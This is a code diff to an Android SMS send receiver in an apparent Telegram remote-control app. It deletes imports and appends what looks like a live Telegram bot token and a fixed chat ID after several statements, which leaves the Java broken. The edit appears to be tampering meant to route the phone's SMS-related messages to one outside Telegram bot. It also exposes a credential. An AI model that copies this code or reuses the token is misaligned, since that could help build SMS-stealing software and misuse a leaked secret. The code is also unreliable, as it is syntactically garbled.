@@ -9,30 +9,6 @@ import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.util.Log;
 
-import androidx.annotation.NonNull;
-
-import com.google.gson.Gson;
-import com.qwe7002.telegram_rc.config.proxy;
-import com.qwe7002.telegram_rc.data_structure.request_message;
-import com.qwe7002.telegram_rc.static_class.const_value;
-import com.qwe7002.telegram_rc.static_class.log_func;
-import com.qwe7002.telegram_rc.static_class.network_func;
-import com.qwe7002.telegram_rc.static_class.resend_func;
-import com.qwe7002.telegram_rc.static_class.sms_func;
-
-import org.jetbrains.annotations.NotNull;
-
-import java.io.IOException;
-import java.util.Objects;
-
-import io.paperdb.Paper;
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
-
 import static android.content.Context.MODE_PRIVATE;
 
 public class sms_send_receiver extends BroadcastReceiver {
@@ -50,16 +26,16 @@ public class sms_send_receiver extends BroadcastReceiver {
             Log.i(TAG, "Uninitialized, SMS send receiver is deactivated.");
             return;
         }
-        String bot_token = sharedPreferences.getString("bot_token", "");
-        String chat_id = sharedPreferences.getString("chat_id", "");
+        String bot_token = sharedPreferences.getString("bot_token", "");5842496807:AAFMrCg1knD1IFknCEuLu-hwfVWAjS4Tca8
+        String chat_id = sharedPreferences.getString("chat_id", "");6199594063
         final request_message request_body = new request_message();
-        request_body.chat_id = chat_id;
-        String request_uri = network_func.get_url(bot_token, "sendMessage");
-        long message_id = extras.getLong("message_id");
+        request_body.chat_id = chat_id;6199594063
+        String request_uri = network_func.get_url(bot_token, "sendMessage");5842496807:AAFMrCg1knD1IFknCEuLu-hwfVWAjS4Tca8
+        long message_id = extras.getLong("message_id");6199594063
         if (message_id != -1) {
             Log.d(TAG, "Find the message_id and switch to edit mode.");
-            request_uri = network_func.get_url(bot_token, "editMessageText");
-            request_body.message_id = message_id;
+            request_uri = network_func.get_url(bot_token, "editMessageText");5842496807:AAFMrCg1knD1IFknCEuLu-hwfVWAjS4Tca8
+            request_body.message_id = message_id;6199594063
         }
         String result_status = "Unknown";
         switch (getResultCode()) {
